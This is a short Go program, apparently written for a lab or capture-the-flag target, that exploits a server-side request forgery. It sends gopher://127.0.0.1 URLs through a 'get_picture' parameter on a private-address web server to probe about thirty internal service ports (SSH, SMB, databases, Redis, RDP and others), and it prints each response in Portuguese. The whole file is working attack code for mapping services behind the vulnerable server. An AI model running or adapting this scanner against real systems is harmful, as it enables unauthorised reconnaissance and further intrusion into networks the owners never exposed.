package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

func main() {

	// 1. Input
	// 2. Parse
	// 3. Scan
	// 4. Output

	// portas := []int{21, 22, 23, 25, 139, 445, 443, 80, 8080, 3306, 5432, 8000, 8888, 8443, 3389}
	portas := []int{21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443, 445, 465, 587, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8443, 9081, 8080, 9000, 10000}

	for _, p := range portas {
		res, err := http.Get("http://10.10.0.9/?get_picture=gopher://127.0.0.1:" + fmt.Sprint(p) + "/_a")

		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		body, err := ioutil.ReadAll(res.Body)
		// fmt.Println(string(body))
		// defer res.Body.Close()

		if len(body) == 0 {
			fmt.Printf("Resposta da porta %d está vazia\n", p)
			// continue
		} else {
			fmt.Printf("Resposta da porta %d: %s\n", p, string(body))
		}

	}
}
